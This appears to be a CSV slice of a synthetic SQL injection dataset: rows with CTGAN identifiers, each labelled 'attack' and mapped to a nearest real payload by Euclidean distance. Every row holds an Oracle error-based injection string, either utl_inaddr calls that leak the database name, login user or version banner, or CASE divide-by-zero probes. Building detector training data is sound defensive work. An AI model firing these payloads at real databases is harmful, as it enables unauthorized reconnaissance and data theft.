id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001878,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,7.967241747928564
CTGAN_001879,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,6.336277053509343
CTGAN_001880,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000027,3.8864276620829354
CTGAN_001881,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,9.35349611070424
CTGAN_001882,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,5.318041390320713
CTGAN_001883,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000002,10.059504076706967
CTGAN_001884,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,5.8565374339980885
CTGAN_001885,attack,error,select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000019,4.953095478243962
CTGAN_001886,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000024,5.756864047491082
CTGAN_001887,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000024,5.490513509562134
CTGAN_001888,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000006,6.690725553554799
CTGAN_001889,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000024,5.102576327082706
CTGAN_001890,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,6.346783024387714
CTGAN_001891,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000024,8.459647464188574
CTGAN_001892,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,4.773884268717566
CTGAN_001893,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000018,3.919798557268022
CTGAN_001894,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000015,3.926128295633722
CTGAN_001895,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,3.814099445651169
CTGAN_001896,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000027,4.845147306654325
CTGAN_001897,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000013,5.257755852526028
CTGAN_001898,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,5.607587323862976
CTGAN_001899,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000003,7.246141564292315
CTGAN_001900,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000005,9.81072084694899
CTGAN_001901,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,4.539730720769546
CTGAN_001902,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,5.00514708324841
CTGAN_001903,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,3.7051193096820114
CTGAN_001904,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,4.092455446016165
CTGAN_001905,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000005,7.607697233716057
CTGAN_001906,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,8.158237094008093
CTGAN_001907,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,3.740610860900308
CTGAN_001908,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,5.219257084598738
CTGAN_001909,attack,error,select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000008,5.806671767977047
CTGAN_001910,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000024,2.9542292967350723
CTGAN_001911,attack,error,select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000019,5.278441582118148
CTGAN_001912,attack,error,select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000031,4.565157920583346
CTGAN_001913,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,7.081672657180426
CTGAN_001914,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000016,3.4819699193405156
CTGAN_001915,attack,error,select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000019,3.9208117042553763
CTGAN_001916,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,3.7311875489602873
CTGAN_001917,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000002,6.592302656921354
CTGAN_001918,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,5.006369380438624
CTGAN_001919,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,4.812920771981171
CTGAN_001920,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,4.215127415201382
CTGAN_001921,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,7.993880848253736
CTGAN_001922,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,3.1817908727091155
CTGAN_001923,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000016,5.021245214077932
CTGAN_001924,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,4.676415027041635
CTGAN_001925,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,4.659603591049194
CTGAN_001926,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,5.254797634595036
CTGAN_001927,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000006,4.774916701111889
CTGAN_001928,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,7.97301420306703
CTGAN_001929,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,7.388705956954936
CTGAN_001930,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,4.794742725739683
CTGAN_001931,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000006,5.017392533879137
CTGAN_001932,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000003,7.713203510616824
CTGAN_001933,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,5.233592481197265
CTGAN_001934,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000024,4.106328336616979
CTGAN_001935,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000016,3.582925841129461
CTGAN_001936,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,8.456055651591859
CTGAN_001937,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000024,5.612863878370625
CTGAN_001938,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,2.533237694269356
CTGAN_001939,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,8.185099020502314
CTGAN_001940,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,5.694096372785146
CTGAN_001941,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000016,4.822352139748938
CTGAN_001942,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,3.5557252516811526
CTGAN_001943,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,7.353498621905071
CTGAN_001944,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,6.568506043098663
CTGAN_001945,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,4.937986502113347
CTGAN_001946,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,3.553489077216516
CTGAN_001947,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,3.9216993462236216
CTGAN_001948,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,4.744269209170411
CTGAN_001949,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000018,5.3783709711572065
CTGAN_001950,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,7.459699246701452
CTGAN_001951,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,3.1963487362986327
CTGAN_001952,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,6.262239866105027
CTGAN_001953,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000028,4.645828723537444
